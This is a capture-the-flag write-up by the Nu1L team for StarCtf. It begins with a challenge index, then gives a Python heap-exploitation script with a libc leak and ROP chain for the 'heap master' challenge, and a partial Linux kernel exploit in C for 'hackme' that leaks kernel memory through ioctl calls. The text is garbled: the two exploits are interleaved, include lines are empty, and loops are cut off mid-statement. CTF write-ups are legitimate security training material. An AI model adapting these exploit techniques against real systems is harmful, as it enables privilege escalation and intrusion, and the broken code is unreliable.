Nu1L StarCtf Writeup
Nu1L StarCtf Writeup
Pwn
heap master
hackme
OOB
babyshell
girlfriend
quicksort
upxofcpp
blind pwn
Web
Echohub
996 Game
mywebsql
Misc
babyﬂash
otaku
Checkin
She
Sokoban
homebrewEvtLoop—
homebrewEvtLoop#
Reverse
Matr1x
fanoGo
yy
Obfuscating Macros II
Crypto
babyprng
babyprng2
notcurves
notfeal
Pwn
heap master
Status: Completed Tags: Pwn
from pwn import *
LOCAL = 0
VERSBOE = 1
if VERSBOE:
    context.log_level = 'debug'
else:
    context.log_level = 'critical'
if LOCAL:
    io = process('./heap_master', env={'LD_PRELOAD': './libc.so.6'}, aslr=False)
else:
    io = remote('34.92.96.238', 60001)
def add(size):
    io.sendlineafter('>> ', '1')
    io.sendlineafter('size: ', str(size))
def edit(off, size, content):
    io.sendlineafter('>> ', '2')
    io.sendlineafter('offset: ', str(off))
    io.sendlineafter('size: ', str(size))
    io.sendafter('content: ', content)
def delete(off):
    io.sendlineafter('>> ', '3')
    io.sendlineafter('offset: ', str(off))
edit(0xc8, 8, p64(0x101))
edit(0x1c8, 8, p64(0x31))
edit(0x1f8, 8, p64(0x31))
delete(0xd0)
edit(0xd8, 2, '\xc0\xd7')
add(0xf0)
edit(0x8, 8, p64(0x1611))
edit(0x8+0x1610, 8, p64(0x31))
delete(0x10)
edit(0x808, 0x10, p64(0x1611) + p64(0x00000000fbad1800))
add(0x1610-0x10)
edit(0x8, 8, p64(0x1651))
edit(0x8+0x1650, 8, p64(0x31))
delete(0x10)
io.recvn(0x10)
leak_addr = u64(io.recvn(8))
print hex(leak_addr)
libc_base = leak_addr - 0x39e683
print hex(libc_base)
edit(0x8, 8, p64(0x3921))
edit(0x8+0x3920, 8, p64(0x31))
delete(0x10)
payload = p64(libc_base+0x177df9)
edit(0x10, len(payload), payload)
add(0x3920-0x10)
libc = ELF('./libc.so.6')
# 0x0000000000177df9 : xchg ebp, edi ; jmp qword ptr [rdx]
# 0x0000000000029933 : leave ; ret
# 0x000000000001feea : pop rdi ; ret
# 0x000000000001fe95 : pop rsi ; ret
# 0x0000000000001b92 : pop rdx ; ret
pop_rdi = libc_base+0x000000000001feea
pop_rsi = libc_base+0x000000000001fe95
pop_rdx = libc_base+0x0000000000001b92
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
data = libc_base + 0x39f000
edit(0, 8, p64(0x0000000000029933+libc_base))
payload = p64(0) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(data) + p64(pop_rdx) + p64(4) + 
p64(read_addr)
payload += p64(pop_rdi) + p64(data) + p64(pop_rsi) + p64(0) + p64(open_addr)
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(data+0x100) + p64(pop_rdx) + p64(0x100) + 
p64(read_addr)
hackme
Status: Completed Tags: Pwn
hack_me
Can you hack me?
https://adworld.xctf.org.cn/media/uploads/task/ae8a640b05bb4223b30a385faed44962.zip
possize+possize
0x2e0/dev/ptmxttytty
leaktty
gadget
r10tty
add rsp,0x200rop
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(data+0x100) + p64(pop_rdx) + p64(0x100) + 
p64(write_addr)
edit(0x800, len(payload), payload)
delete(0x800)
io.send('flag')
io.interactive()
ssh PI:EMAIL -p 10022
password: pwn
0xffffffff81003ea4 : lea rsp, qword ptr [r10 - 8] ; ret
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#define READ 0x30003 //
#define EDIT 0x30002  // 
#define ALLOC 0x30000
#define FREE 0x30001
#define CRED_SIZE 0x78
#define FORK_NUM 20
#define u64 unsigned long long
struct exp
{
    size_t index;
    void* buf;
    size_t size;
    size_t pos;
}exp1;
static int is_fin = 0;
static int uid = 0;
static int idd[FORK_NUM] = {0};
char buf[0x100] = {0};
u64 leak_kernel = 0;
u64 kernel_base = 0;
u64 leak_heap = 0;
u64 buf_addr = 0;
u64 user_cs, user_ss, user_rflags;
static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}
void print_hex(unsigned long long *d)
{
    for(int i=0;ibuf = malloc(0x100000);
    memcpy(alloc->buf,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",0x100);
    alloc->size = 0x2e0;
    alloc->index = 0;
    alloc->pos = 0;    
    int fd=open("/dev/kdb",0);
    int a =ioctl(f,ALLOC,alloc);
    if(a == -1)
    {return 0;}
    for(int i=0;iindex++;
        a =ioctl(f,ALLOC,alloc); 
    }
    alloc->index = 0;
    printf("%d\n",a);
    size_t i=64;
    // leak
    for(;ibuf,0,0x100000);
        size_t t = 0 - i;
        alloc->pos = t;
        alloc->size = i + 1;
        a = ioctl(f,READ,alloc);
        if(a == -1)
        {
            printf("error ! \n");
            return 0;
        }
        print_hex((unsigned long long*)alloc->buf);
    }
    memset(alloc->buf,0,8);
    printf("[-]free chunk\n");
    for(int i=1;iindex = i;
        if(i == 3)
        {
            continue;
        }
        a = ioctl(f,FREE,alloc);
        printf("%d ",a);
    }
    for(int i=0;iindex = 3;
    alloc->pos = 0 - 0x400;
    alloc->size =  0x401;
    a = ioctl(f,READ,alloc);
    kernel_base =((u64*)alloc->buf)[3] -6446176;
    buf_addr = ((u64*)alloc->buf)[7]-(0xffff88800e80d838 - 0xffff88800e80d000);
    printf("[****]re leak %p %p",kernel_base,buf_addr);
    for(int i=0;ibuf)[i] = kernel_base + 16036; //  
    }
    //((u64*)alloc->buf)[21] = kernel_base + 1335202;
    ((u64*)alloc->buf)[0] = buf_addr;
    alloc->index = 0;
    alloc ->pos = 0;
    alloc -> size = 0x2d0; 
    ioctl(f,EDIT,alloc);
    alloc->index = 3;
    alloc->pos = 0 - 0x400;
    alloc->size =  0x401;
    a = ioctl(f,READ,alloc);
    printf("\n%d\n",a);